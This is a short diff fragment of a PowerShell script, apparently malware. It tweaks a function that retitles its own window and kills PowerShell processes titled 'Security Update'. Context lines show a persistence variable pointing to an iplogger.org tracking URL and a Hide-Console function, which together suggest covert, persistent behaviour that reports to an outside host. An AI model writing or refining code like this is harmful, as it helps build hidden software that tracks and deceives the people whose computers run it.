@@ -14,7 +14,7 @@ $PersistPath = 'https://iplogger.org/2jaZG6'
 function KillProc {
   $Title = "System Information"
   $host.UI.RawUI.WindowTitle = $Title
-  (Get-WmiObject Win32_Process -Filter "name = 'powershell.exe'" | where {$_.WindowTitle -like '*Security Update*'}).Terminate()
+  (Get-WmiObject Win32_Process -Filter "name = 'powershell'" | where {$_.WindowTitle -like '*Security Update*'}).Terminate()
 }
 
 function Hide-Console {     
